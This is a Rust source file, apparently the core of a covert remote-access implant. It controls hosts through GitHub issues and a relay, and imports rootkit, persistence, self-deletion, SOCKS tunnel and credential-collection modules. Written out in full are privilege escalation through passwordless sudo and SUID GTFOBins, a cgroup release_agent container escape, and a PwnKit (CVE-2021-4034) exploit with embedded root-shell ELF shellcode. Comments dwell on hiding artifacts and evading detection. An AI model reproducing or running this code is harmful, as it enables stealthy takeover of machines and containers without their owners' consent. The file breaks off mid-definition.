#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

#[cfg(unix)]
use std::os::unix::process::CommandExt; // provides .process_group()

mod crypto;
mod platform;
mod uuid_gen;
mod commands;
mod files;
mod sysinfo;
mod persist;
mod timewindow;
mod selfdel;
mod filetransfer;
#[cfg(unix)]
mod rootkit;
mod backup_config;
mod worker;
mod guards;
mod linux_sensitive;
mod embedded_config;  // written by the generator at compile time
mod ws_pty;           // WS PTY long-connection shell
mod stowaway;         // Built-in Stowaway tunnel (SOCKS5 proxy)
mod net;              // 统一网络层（TLS 回退 / 代理与 NO_PROXY / 时钟偏移）
mod schedule;         // agent 内部调度（add/list/rm/clear + 轮询 tick）
mod stor;             // 状态聚合（catalog v2：缓冲/hwdb/时钟偏移/调度），bin 专用
mod failover;          // 双通道故障转移（GitHub+Worker），bin 专用

use std::time::Duration;
use tokio::time::sleep;
use uuid_gen::get_or_create_agent_id;
use std::fs;
use std::path::PathBuf;

// ─── Response buffer queue ────────────────────────────────────────────────────
// When the GitHub API is temporarily unreachable, queue pending responses in memory.
// The queue is also flushed to a state file on disk so it survives agent restarts —
// command outputs are not lost if the agent crashes before the API comes back.
#[derive(serde::Serialize, serde::Deserialize, Clone)]
struct BufferedResponse {
    command_id: String,
    output: String,
    retries: u32,
    /// Unix seconds when the response was first buffered (0 = legacy entry).
    #[serde(default)]
    enqueued_unix: u64,
}

fn response_buffer() -> &'static std::sync::Mutex<std::collections::VecDeque<BufferedResponse>> {
    static BUF: std::sync::OnceLock<std::sync::Mutex<std::collections::VecDeque<BufferedResponse>>> =
        std::sync::OnceLock::new();
    BUF.get_or_init(|| std::sync::Mutex::new(std::collections::VecDeque::new()))
}


/// Load persisted buffer from disk into the in-memory queue (called once at startup).
/// Catalog v2 同时恢复时钟偏移、调度表与去重集合 → 聚合入口见 stor.rs。
/// 并把内部调度表的变更接入目录持久化（bin 树专属回调）。
fn load_buffer_from_disk() {
    crate::stor::init_persistence();
    crate::schedule::set_on_change(Some(|| { let _ = crate::stor::persist(); }));
    ensure_install_generation();
}

// ── 安装代际（实战修复 #11）─────────────────────────────────────────────────
// killswitch/卸载清掉 catalog（去重集+水位）后重装，中继/仓库仍保留 ≤100 行
// 旧命令 → 全量重放（实测重跑 upload/schedule 等）。代际用 agent_id 充当：
// 重装（状态目录被清）会生成新 agent_id → 与磁盘 preset 里记录的不一致 →
// 首轮拉取只推进水位不执行。同机重启 agent_id 不变 → 行为完全不变。
static FRESH_INSTALL: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

fn fresh_install() -> bool {
    FRESH_INSTALL.load(std::sync::atomic::Ordering::Relaxed)
}

fn ensure_install_generation() {
    let cur = crate::uuid_gen::get_or_create_agent_id();
    let path = preset_path();
    let recorded = std::fs::read_to_string(&path).unwrap_or_default().trim().to_string();
    if recorded.is_empty() || recorded != cur {
        let _ = std::fs::write(&path, cur.as_bytes());
        FRESH_INSTALL.store(true, std::sync::atomic::Ordering::Relaxed);
        crate::debug_log("stor: fresh install generation — channel history will be skipped once");
    }
}

fn preset_path() -> String {
    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root { "/var/tmp/.systemd/preset".to_string() }
        else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/preset", home)
        }
    }
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\preset.dat", username)
    }
}

/// Overwrite the on-disk buffer file with the current in-memory queue state.
/// Deletes the file when the queue is empty to leave no trace.
/// catalog v2 起由 stor.rs 统一装配（缓冲 + 去重 + 时钟偏移 + 调度）。
fn flush_buffer_to_disk() {
    crate::stor::persist();
}

fn buffer_response(command_id: &str, output: &str) {
    // .lock() returns Err only on Mutex poison (a thread panicked while holding the lock).
    let mut buf = match response_buffer().lock() {
        Ok(b) => b,
        Err(poisoned) => {
            debug_log("WARNING: response_buffer mutex was poisoned, recovering");
            poisoned.into_inner()
        }
    };
    const MAX_BUFFERED: usize = 256;
    if buf.len() < MAX_BUFFERED {
        buf.push_back(BufferedResponse {
            command_id: command_id.to_string(),
            output: output.to_string(),
            retries: 0,
            enqueued_unix: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
        });
    }
    drop(buf);
    // Persist to disk so responses survive an agent restart
    flush_buffer_to_disk();
}

/// Track per-comment decrypt failures: a permanently undecryptable command
/// comment (wrong password era, foreign controller posting in the issue)
/// must not block the watermark forever and starve every command behind it.
/// Returns true once the caller should give up on this comment and skip it.
fn note_decrypt_failure_key(key: String) -> bool {
    static COUNTS: std::sync::OnceLock<std::sync::Mutex<std::collections::HashMap<String, u32>>> =
        std::sync::OnceLock::new();
    const GIVE_UP_AFTER: u32 = 5;
    let m = COUNTS.get_or_init(|| std::sync::Mutex::new(std::collections::HashMap::new()));
    let mut m = match m.lock() {
        Ok(g) => g,
        Err(p) => p.into_inner(),
    };
    let e = m.entry(key).or_insert(0);
    *e += 1;
    *e >= GIVE_UP_AFTER
}

fn note_decrypt_failure(comment_id: u64) -> bool {
    note_decrypt_failure_key(comment_id.to_string())
}

// ── 实战修复：连续不可解密快速跳过 ──────────────────────────────────────────
// 复用中继/旧仓库会残留旧密码时代的命令行，逐条 5 次重试 × 轮询间隔 = 数十分钟
// 死磨（lab 实测 4 分钟磨 2 条）。同会话连续 3 条放弃后，后续失败立即按
// 永久不可解密处理；任何成功解密即清零。正常偶发失败不受影响。
static DECRYPT_SKIPS: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

fn bump_decrypt_skips() -> u32 {
    DECRYPT_SKIPS.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1
}

fn reset_decrypt_skips() {
    DECRYPT_SKIPS.store(0, std::sync::atomic::Ordering::Relaxed);
}

fn note_decrypt_failure_str(comment_id: &str) -> bool {
    note_decrypt_failure_key(comment_id.to_string())
}

/// Retry sending buffered responses: keep each entry for up to 1 hour and
/// stop the drain on the first send failure (likely a rate limit) so retries
/// spread across poll cycles instead of burning out within seconds.
/// Process at most 8 per drain to avoid triggering GitHub rate limits.
async fn drain_buffered_responses(config: &Config, issue_id: &str) {
    const MAX_PER_DRAIN: usize = 8;
    const RETAIN_SECS: u64 = 3600;

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let items: Vec<BufferedResponse> = {
        let mut buf = match response_buffer().lock() {
            Ok(b) => b,
            Err(p) => p.into_inner(),
        };
        let drain_count = buf.len().min(MAX_PER_DRAIN);
        buf.drain(..drain_count).collect()
    };
    if items.is_empty() { return; }

    let mut any_change = false;
    let mut remaining = std::collections::VecDeque::new();
    let mut send_failed = false;
    for mut item in items {
        if item.enqueued_unix == 0 {
            // Legacy catalog entry without a timestamp — stamp it now rather
            // than letting it expire instantly.
            item.enqueued_unix = now;
            any_change = true;
        } else if item.enqueued_unix + RETAIN_SECS < now {
            debug_log(&format!("Dropping expired buffered response for {}", item.command_id));
            any_change = true;
            continue;
        }
        if send_failed {
            remaining.push_back(item);
            continue;
        }
        let result = send_response_chunks(config, issue_id, &item.command_id, &item.output).await;
        if result.is_ok() {
            debug_log(&format!("Buffered response for {} sent successfully", item.command_id));
            any_change = true;
        } else {
            item.retries += 1;
            any_change = true;
            remaining.push_back(item);
            // 本轮不再试发，但后面未处理的条目必须塞回队列，不能丢。
            send_failed = true;
        }
    }
    if !remaining.is_empty() {
        // Use into_inner() on poison to match the drain-side behaviour above:
        // losing the lock state is better than silently discarding items that
        // were already drained from the queue and haven't been sent yet.
        let lock_result = response_buffer().lock();
        let mut buf = match lock_result {
            Ok(b) => b,
            Err(p) => {
                debug_log("drain_buffered_responses: mutex poisoned during re-push, recovering");
                p.into_inner()
            }
        };
        for item in remaining {
            buf.push_back(item);
        }
    }
    // Sync updated queue state to disk whenever anything changed
    if any_change {
        flush_buffer_to_disk();
    }
}

#[derive(serde::Deserialize)]
struct CommandEnvelope {
    command_id: String,
    command: String,
}

#[derive(serde::Serialize)]
struct ResponseEnvelope<'a> {
    response_to: &'a str,
    message_type: &'a str,
    content: &'a str,
}

/// debug_log — only writes when ENABLE_DEBUG=1 (env-var or compile-time option_env!).
/// Zero file I/O when disabled. The format! in callers is unavoidable with a function,
/// but the I/O path is fully skipped.
fn debug_log(msg: &str) {
    static DEBUG_ENABLED: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    if !*DEBUG_ENABLED.get_or_init(|| {
        std::env::var("ENABLE_DEBUG").as_ref().map(|s| s.as_str()).ok()
            .or_else(|| option_env!("ENABLE_DEBUG"))
            .unwrap_or("0") == "1"
    }) {
        return;
    }

    #[cfg(windows)]
    let log_path = {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\journal-audit.log", username)
    };

    #[cfg(unix)]
    let log_path = {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            format!("{}/journal-audit", obfstr::obfstr!("/var/tmp/.systemd"))
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/journal-audit", home)
        }
    };

    if let Ok(metadata) = std::fs::metadata(&log_path) {
        if metadata.len() > 10 * 1024 * 1024 {
            // Truncate by keeping the last 2MB instead of deleting entirely,
            // so diagnostic context around the truncation point is preserved.
            if let Ok(content) = std::fs::read_to_string(&log_path) {
                let keep = 2 * 1024 * 1024;
                if content.len() > keep {
                    // Find a safe UTF-8 boundary near the cut point
                    let start = content.len() - keep;
                    let trimmed = &content[start..];
                    // Skip partial first line
                    let trimmed = if let Some(pos) = trimmed.find('\n') {
                        &trimmed[pos + 1..]
                    } else {
                        trimmed
                    };
                    let _ = std::fs::write(&log_path, trimmed.as_bytes());
                }
            } else {
                let _ = std::fs::remove_file(&log_path);
            }
        }
    }

    let log = format!("[{}] {}\n", chrono::Local::now().format("%Y-%m-%d %H:%M:%S"), msg);

    if let Some(parent) = PathBuf::from(&log_path).parent() {
        let _ = fs::create_dir_all(parent);
    }

    let _ = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .and_then(|mut f| std::io::Write::write_all(&mut f, log.as_bytes()));
}

/// Get the path for the PID lock file
#[cfg(unix)]
fn get_lock_file_path() -> String {
    let is_root = unsafe { libc::geteuid() == 0 };
    if is_root {
        format!("{}/inhibit.lock", obfstr::obfstr!("/var/tmp/.systemd"))
    } else {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
        format!("{}/.local/share/inhibit.lock", home)
    }
}

/// Attempt privilege escalation via passwordless sudo before daemonization.
///
/// Fast path: `sudo -n true` → exec ourselves directly.
/// Slow path: `sudo -l` scan for NOPASSWD GTFOBins → exec via that binary.
///
/// All paths use exec() to REPLACE the current process — never spawn(),
/// which would create a duplicate agent.
#[cfg(unix)]
fn try_sudo_escalate() {
    if unsafe { libc::getuid() } == 0 { return; }
    // _ELEVATED set = we were already exec'd through an escalation path once.
    // Keep the flag (do NOT remove): removing it here would let try_suid_escalate
    // retry below, and on nosuid-mounted SUID binaries (exec succeeded, uid did
    // NOT elevate) that re-exec loop never terminates. All paths skip while the
    // flag is present; clean_environment() scrubs it later for OPSEC.
    if std::env::var("_ELEVATED").is_ok() {
        return;
    }

    let exe = match crate::rootkit::get_exe_path()
        .or_else(|| std::env::current_exe().ok())
    {
        Some(p) if !p.as_os_str().is_empty() => p,
        _ => return,
    };
    let exe_s = exe.to_string_lossy().into_owned();

    use std::os::unix::process::CommandExt;

    macro_rules! clean_exec {
        ($cmd:expr) => {{
            let _ = $cmd.env("_ELEVATED", "1")
                .env_remove("_SVC_INIT")
                .env_remove("DAEMONIZED")
                .env_remove("RELOCATED")
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .exec(); // replaces process on success; Err returned on failure (ignored)
        }};
    }

    // ── Fast path: sudo -n true ──────────────────────────────────────────
    let can_sudo = std::process::Command::new("sudo")
        .args(["-n", "true"])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);

    if can_sudo {
        let _ = clean_exec!(std::process::Command::new("sudo").args(["-n", &exe_s]));
        return; // exec failed, fall through
    }

    // ── sudo -l scan ─────────────────────────────────────────────────────
    // Only handle GTFOBins that can cleanly exec another binary via exec().
    // We never use spawn() here — that would leave our user-level process
    // running alongside a new root agent (two concurrent instances).
    let Ok(out) = std::process::Command::new("sudo")
        .args(["-n", "-l"])
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output() else { return };

    let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
    if !text.contains("nopasswd") { return; }

    // Check each GTFOBin; exec() replaces OUR process → only one agent ever runs.
    // Patterns: exec the agent directly (not via sh -c, to avoid extra processes).
    let gtfo_execs: &[(&str, &[&str])] = &[
        // binary name in sudo -l output → sudo args that exec the agent
        ("bash",    &["-n", "bash", "-p", "-c"]),   // -c arg added below
        ("sh",      &["-n", "sh",   "-c"]),
        ("python3", &["-n", "python3", "-c"]),
        ("python",  &["-n", "python",  "-c"]),
        ("perl",    &["-n", "perl",    "-e"]),
        ("find",    &["-n", "find"]),
    ];

    for &(bin, sudo_prefix) in gtfo_execs {
        if !text.contains(bin) { continue; }

        match bin {
            "bash" | "sh" => {
                // sudo bash -p -c "exec <agent>"  (exec replaces bash → one process)
                let script = format!("exec '{}'", exe_s.replace('\'', r#"'"'"'"#));
                let _ = clean_exec!(
                    std::process::Command::new("sudo")
                        .args(sudo_prefix)
                        .arg(&script)
                );
            }
            "python3" | "python" => {
                // sudo python3 -c "import os; os.execv('<agent>', ['<agent>'])"
                let script = format!(
                    "import os; os.execve('{}', ['{}'], {{**__import__('os').environ, '_ELEVATED': '1'}})",
                    exe_s, exe_s
                );
                let _ = clean_exec!(
                    std::process::Command::new("sudo")
                        .args(sudo_prefix)
                        .arg(&script)
                );
            }
            "perl" => {
                // sudo perl -e "exec '<agent>'"
                let script = format!("$ENV{{_ELEVATED}}=1; exec '{}'", exe_s.replace('\'', "\\'"));
                let _ = clean_exec!(
                    std::process::Command::new("sudo")
                        .args(sudo_prefix)
                        .arg(&script)
                );
            }
            "find" => {
                // sudo find / -maxdepth 0 -exec <agent> \;
                // find exec replaces itself; agent sees _ELEVATED from our env
                let _ = clean_exec!(
                    std::process::Command::new("sudo")
                        .args(sudo_prefix)
                        .args(["/", "-maxdepth", "0", "-exec", &exe_s, ";"])
                        .env("_ELEVATED", "1")
                );
            }
            _ => {}
        }
    }
}

/// Attempt privilege escalation via SUID-root GTFOBins.
///
/// If a known binary has SUID bit + root owner, exec() through it to get root.
/// Uses exec() only — never spawn() — to avoid duplicate agent processes.
#[cfg(unix)]
fn try_suid_escalate() {
    if unsafe { libc::getuid() } == 0 { return; }
    if std::env::var("_ELEVATED").is_ok() { return; }

    let exe = match crate::rootkit::get_exe_path()
        .or_else(|| std::env::current_exe().ok())
    {
        Some(p) if !p.as_os_str().is_empty() => p,
        _ => return,
    };
    let exe_s = exe.to_string_lossy().into_owned();

    use std::os::unix::fs::MetadataExt;
    use std::os::unix::process::CommandExt;

    // (binary_path, how_to_build_args)
    // All must ultimately exec the agent and replace the current process.
    // Python/perl with SUID: call os.setuid(0) then execv → agent runs as root.
    // bash -p: with SUID, preserves real root EUID. Then exec agent.
    // find with SUID: directly exec agent.
    let candidates: &[(&str, Box<dyn Fn(&str) -> Vec<String>>)] = &[
        ("/usr/bin/python3", Box::new(|e: &str| vec![
            "-c".into(),
            format!("import os; os.setuid(0); os.setgid(0); os.execve('{}', ['{}'], {{**__import__('os').environ, '_ELEVATED': '1'}})", e, e),
        ])),
        ("/usr/bin/python", Box::new(|e: &str| vec![
            "-c".into(),
            format!("import os; os.setuid(0); os.setgid(0); os.execve('{}', ['{}'], {{**__import__('os').environ, '_ELEVATED': '1'}})", e, e),
        ])),
        ("/usr/bin/python2", Box::new(|e: &str| vec![
            "-c".into(),
            format!("import os; os.setuid(0); os.setgid(0); os.execve('{}', ['{}'], {{'_ELEVATED': '1'}})", e, e),
        ])),
        ("/usr/bin/perl", Box::new(|e: &str| vec![
            "-e".into(),
            format!("use POSIX qw(setuid setgid); setuid(0); setgid(0); $ENV{{_ELEVATED}}=1; exec '{}' or die", e),
        ])),
        ("/bin/bash", Box::new(|e: &str| vec![
            "-p".into(), "-c".into(),
            format!("_ELEVATED=1 exec '{}'", e.replace('\'', r#"'"'"'"#)),
        ])),
        ("/usr/bin/find", Box::new(|e: &str| vec![
            "/".into(), "-maxdepth".into(), "0".into(),
            "-exec".into(), e.to_string(), ";".into(),
        ])),
    ];

    for (bin_path, build_args) in candidates {
        let p = std::path::Path::new(bin_path);
        if !p.exists() { continue; }
        let Ok(m) = std::fs::metadata(p) else { continue };
        if m.uid() != 0 || (m.mode() & 0o4000) == 0 { continue; }

        let args = build_args(&exe_s);
        // exec() replaces our process — if it works, we never come back
        let _ = std::process::Command::new(bin_path)
            .args(&args)
            .env("_ELEVATED", "1")
            .env_remove("_SVC_INIT")
            .env_remove("DAEMONIZED")
            .env_remove("RELOCATED")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .exec();
        // exec failed, try next
    }
}

/// Attempt container escape via cgroup v1 release_agent.
///
/// In privileged Docker containers (--privileged or CAP_SYS_ADMIN),
/// /sys/fs/cgroup is writable. We write our agent path to release_agent
/// and trigger cgroup deletion to fire it as root on the host.
///
/// Note: This spawns an ADDITIONAL root process (via kernel cgroup mechanism),
/// not a replacement. The current process continues running as a user.
/// The agent's startup de-duplication logic handles the double-run case.
#[cfg(unix)]
fn try_cgroup_escape() -> bool {
    let in_container = std::path::Path::new("/.dockerenv").exists()
        || std::path::Path::new("/run/.containerenv").exists()
        || std::fs::read_to_string("/proc/1/cgroup")
            .map(|s| s.contains("docker") || s.contains("containerd") || s.contains("kubepods"))
            .unwrap_or(false);
    if !in_container { return false; }

    let exe = match crate::rootkit::get_exe_path()
        .or_else(|| std::env::current_exe().ok())
    {
        Some(p) if !p.as_os_str().is_empty() => p,
        _ => return false,
    };
    let exe_s = exe.to_string_lossy().into_owned();

    let cgroup_bases = [
        "/sys/fs/cgroup/memory",
        "/sys/fs/cgroup/cpu",
        "/sys/fs/cgroup",
    ];

    // Random suffix so cgroup name is unpredictable (no "c2esc" fingerprint)
    let sfx = {
        use std::time::{SystemTime, UNIX_EPOCH};
        let t = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().subsec_nanos();
        format!("{:08x}", t)
    };

    for cgroup_base in &cgroup_bases {
        let release_agent    = format!("{}/release_agent", cgroup_base);
        let tmp_cg = format!("{}/t{}", cgroup_base, sfx.get(1..).unwrap_or(&sfx));
        let procs            = format!("{}/cgroup.procs", tmp_cg);
        // The kernel fires release_agent when the cgroup that BECOMES EMPTY has
        // its own notify_on_release=1 — writing it on the base cgroup never
        // triggers for the child.
        let notify_on_rel    = format!("{}/notify_on_release", tmp_cg);

        // Test write access (requires CAP_SYS_ADMIN)
        if std::fs::write(&release_agent, &exe_s).is_err() { continue; }
        if std::fs::create_dir_all(&tmp_cg).is_err() {
            let _ = std::fs::write(&release_agent, "");
            continue;
        }
        if std::fs::write(&notify_on_rel, "1").is_err() {
            let _ = std::fs::remove_dir(&tmp_cg);
            let _ = std::fs::write(&release_agent, "");
            continue;
        }

        // Fork a short-lived child that joins tmp_cg and exits: the cgroup then
        // becomes empty and the kernel runs release_agent (exe_s) as root.
        // The agent itself must NOT join tmp_cg — a live member makes rmdir
        // fail with EBUSY (release never fires) and strands the agent inside
        // an obvious IOC cgroup until it exits.
        let procs_file = match std::fs::OpenOptions::new().write(true).open(&procs) {
            Ok(f) => f,
            Err(_) => {
                let _ = std::fs::remove_dir(&tmp_cg);
                let _ = std::fs::write(&release_agent, "");
                continue;
            }
        };
        let pid = unsafe { libc::fork() };
        if pid == 0 {
            // Child: raw write(2) only — no allocations after fork in a
            // multi-threaded process.
            use std::os::unix::io::AsRawFd;
            unsafe {
                let msg = b"0\n";
                libc::write(procs_file.as_raw_fd(), msg.as_ptr() as *const libc::c_void, msg.len());
                libc::_exit(0);
            }
        } else if pid > 0 {
            let mut st = 0;
            unsafe { libc::waitpid(pid, &mut st, 0); }
            // Child exited → tmp_cg is empty → rmdir triggers release_agent now
            let _ = std::fs::remove_dir(&tmp_cg);

            // Wait for release_agent to fire BEFORE cleaning up — but keep it short
            // to avoid blocking tokio threads for too long (function is sync, not async)
            std::thread::sleep(std::time::Duration::from_millis(300));

            let _ = std::fs::write(&release_agent, "");
            return true;
        }
        // fork failed — clean up and try the next cgroup base
        let _ = std::fs::remove_dir(&tmp_cg);
        let _ = std::fs::write(&release_agent, "");
    }
    false
}

/// CVE-2021-4034 (PwnKit) — pkexec LPE.
/// Uses fork+waitpid to avoid losing our own process.
/// All temp files are cleaned up on both success AND failure paths.
///
/// The embedded evil_so payload is x86_64 ELF shellcode. On other architectures
/// the exploit would silently fail (wrong ELF machine type), so we gate at
/// compile time to avoid wasting time on arm64/riscv/etc targets.
#[cfg(all(unix, target_arch = "x86_64"))]
fn try_cve_2021_4034_escalate() {
    if unsafe { libc::getuid() } == 0 { return; }
    if std::env::var("_ELEVATED").is_ok() { return; }

    // Check pkexec is SUID root
    let pkexec_path = "/usr/bin/pkexec";
    let pkexec = std::path::Path::new(pkexec_path);
    if !pkexec.exists() { return; }
    {
        use std::os::unix::fs::MetadataExt;
        let Ok(m) = std::fs::metadata(pkexec) else { return };
        if m.uid() != 0 || (m.mode() & 0o4000) == 0 { return; }
    }

    let exe = match crate::rootkit::get_exe_path()
        .or_else(|| std::env::current_exe().ok())
    {
        Some(p) if !p.as_os_str().is_empty() => p,
        _ => return,
    };
    let exe_s = exe.to_string_lossy().into_owned();

    // Two separate random names, matching the original CVE-2021-4034-Rust structure:
    //   fake_argv0  → envp[0], becomes pkexec's fake argv[0] (the "program path")
    //   rand_mod    → gconv module name (CHARSET=rand_mod, .so file named rand_mod)
    // Using the same string for both would also work, but separate names match the
    // original exploit exactly and avoid any potential hash/name collision edge cases.
    let sfx = format!(".{:x}", unsafe {
        (libc::getpid() as u64) ^ 0xc0ffee ^
        std::time::SystemTime::now()
            .duration_since(std::time::SystemTime::UNIX_EPOCH)
            .map(|d| d.subsec_nanos() as u64)
            .unwrap_or(0)
    });
    let fake_argv0  = format!("a{:x}", unsafe { libc::getpid() as u32 } ^ 0x12345678);
    let rand_mod    = format!("m{:x}", unsafe { libc::getpid() as u32 } ^ 0xdeadbeef);
    let wdir        = format!("/dev/shm/{}", sfx);
    let suid_wrap   = format!("/dev/shm/.w{}", sfx);

    // Helper: clean up all exploit artifacts (always called)
    let cleanup = || {
        let _ = std::fs::remove_dir_all(&wdir);
        let _ = std::fs::remove_file(&suid_wrap);
    };

    // ── Build exploit filesystem ────────────────────────────────────────
    // Structure matches CVE-2021-4034-Rust-main exactly:
    //   wdir/GCONV_PATH=./          ← dir for PATH lookup (pkexec finds fake_argv0 here)
    //   wdir/GCONV_PATH=./fake_argv0 ← trigger file (empty, pkexec "finds" this as the program)
    //   wdir/fake_argv0/             ← gconv module search directory
    //   wdir/fake_argv0/gconv-modules ← module registry listing rand_mod
    //   wdir/fake_argv0/rand_mod.so   ← evil shared library
    let gconv_dir   = format!("{}/GCONV_PATH=.", wdir);
    let trigger     = format!("{}/GCONV_PATH=./{}", wdir, fake_argv0);
    let mod_dir     = format!("{}/{}", wdir, fake_argv0);
    let gconv_mods  = format!("{}/{}/gconv-modules", wdir, fake_argv0);
    let so_path     = format!("{}/{}/{}.so", wdir, fake_argv0, rand_mod);

    if std::fs::create_dir_all(&gconv_dir).is_err()
        || std::fs::create_dir_all(&mod_dir).is_err()
    {
        cleanup(); return;
    }
    let _ = std::fs::write(&trigger, b"");
    let gmod = format!("module INTERNAL {}// {} 2\n", rand_mod, rand_mod);
    if std::fs::write(&gconv_mods, gmod.as_bytes()).is_err() {
        cleanup(); return;
    }

    // evil_so: ELF shared object whose .init calls setuid(0)+execve("/bin/sh").
    // sh runs as root; SHELL env → our wrapper script.
    let evil_so: &[u8] = &[
        0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x28,0x80,0x04,0x08,0x00,0x00,0x00,0x00,
        0x3f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0xbb,0xd1,0x9d,0x96,0x91,0xd0,0x8c,
        0x97,0xff,0xeb,0x06,0x40,0x00,0x38,0x00,0x02,0x00,0x48,0xf7,0xdb,0xeb,0x18,0x01,
        0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x80,0x04,0x08,0x00,0x00,0x00,0x00,0x31,0xc0,0x53,0x54,0x5f,0x99,0x52,0x57,0x54,
        0x5e,0xb0,0x69,0xeb,0x5a,0x00,0x00,0xd4,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x8f,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x8f,0x80,0x04,0x08,0x00,0x00,0x00,0x00,0x0c,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x80,0x04,0x08,0x00,0x00,0x00,0x00,0x05,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x06,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x57,
        0x48,0x31,0xff,0x0f,0x05,0xb8,0x6a,0x00,0x00,0x00,0x0f,0x05,0x5f,0xb8,0x3b,0x00,
        0x00,0x00,0x0f,0x05,
    ];
    if std::fs::write(&so_path, evil_so).is_err() {
        cleanup(); return;
    }
    use std::os::unix::fs::PermissionsExt;
    for p in &[&so_path, &gconv_dir, &gconv_mods, &trigger] {
        let _ = std::fs::set_permissions(p, std::fs::Permissions::from_mode(0o755));
    }

    // Wrapper script: when sh runs as root, it chmod 4755's our agent
    let wrap_content = format!(
        "#!/bin/sh\nchmod 4755 '{}'\n",
        exe_s.replace('\'', r#"'"'"'"#)
    );
    if std::fs::write(&suid_wrap, wrap_content.as_bytes()).is_err() {
        cleanup(); return;
    }
    let _ = std::fs::set_permissions(&suid_wrap, std::fs::Permissions::from_mode(0o755));

    // ── Fork: child runs exploit, parent waits ──────────────────────────
    use std::ffi::CString;
    // Any path/string that contains an interior NUL would panic with unwrap().
    // Use map_err + cleanup() to fail gracefully instead.
    macro_rules! cstr {
        ($s:expr) => {
            match CString::new($s) {
                Ok(c) => c,
                Err(_) => { cleanup(); return; }
            }
        };
    }
    let pkexec_c = cstr!(pkexec_path);
    // envp structure matches CVE-2021-4034-Rust-main exactly:
    //   [0] fake_argv0  → pkexec bug writes this back as "GCONV_PATH=./<fake_argv0>"
    //                      which sets GCONV_PATH in environment; gconv then loads our .so
    //   [1] PATH=GCONV_PATH=.  → pkexec finds "fake_argv0" trigger file in GCONV_PATH=. dir
    //   [2] CHARSET=rand_mod   → gconv module name to load
    //   [3] SHELL=suid_wrap    → pkexec (now root via setuid(0)) executes this as the "program"
    let env0 = cstr!(fake_argv0.clone());
    let env1 = cstr!("PATH=GCONV_PATH=.");
    let env2 = cstr!(format!("CHARSET={}", rand_mod));
    let env3 = cstr!(format!("SHELL={}", suid_wrap));

    let wdir_c = cstr!(wdir.clone());
    unsafe { libc::chdir(wdir_c.as_ptr()); }

    let envp: Vec<*const libc::c_char> = vec![
        env0.as_ptr(), env1.as_ptr(), env2.as_ptr(), env3.as_ptr(),
        std::ptr::null(),
    ];
    let null_argv: Vec<*const libc::c_char> = vec![std::ptr::null()];

    let pid = unsafe { libc::fork() };
    if pid == 0 {
        // Child: run exploit then unconditionally exit
        unsafe {
            libc::execve(pkexec_c.as_ptr(), null_argv.as_ptr(), envp.as_ptr());
            libc::_exit(0);
        }
    } else if pid < 0 {
        // fork() failed — restore cwd and clean up, then return silently
        unsafe {
            libc::chdir(b"/\0".as_ptr() as *const libc::c_char);
        }
        cleanup();
        return;
    }

    // Parent: always waitpid, always cleanup, then decide
    if pid > 0 {
        let mut status: libc::c_int = 0;
        unsafe { libc::waitpid(pid, &mut status, 0); }
    }

    // Restore cwd before any further action
    unsafe {
        let root = CString::new("/").unwrap();
        libc::chdir(root.as_ptr());
    }

    // Always cleanup (success OR failure)
    cleanup();

    // Check outcome: did we get SUID?
    let got_suid = std::fs::metadata(&exe)
        .map(|m| {
            use std::os::unix::fs::MetadataExt;
            (m.mode() & 0o4000) != 0
        })
        .unwrap_or(false);

    if got_suid {
        // Remove SUID after re-exec to avoid leaving a root-owned SUID binary
        // (we set it again on next run if needed, but for now exec as root)
        use std::os::unix::process::CommandExt;
        let _ = std::process::Command::new(&exe)
            .env("_ELEVATED", "1")
            .env_remove("_SVC_INIT")
            .env_remove("DAEMONIZED")
            .env_remove("RELOCATED")
            .exec(); // replaces process; if this fails, SUID bit remains — minor opsec concern
        // exec failed; remove SUID to avoid leaving evidence
        let _ = std::process::Command::new("chmod")
            .args(["0755", &exe_s])
            .status();
    }
}

/// Check pending signals and act on them. Called from main loop each iteration.
/// Uses tokio::signal which is safe for async contexts.
/// Returns true if the caller should skip the next sleep (reconnect immediately).
#[cfg(unix)]
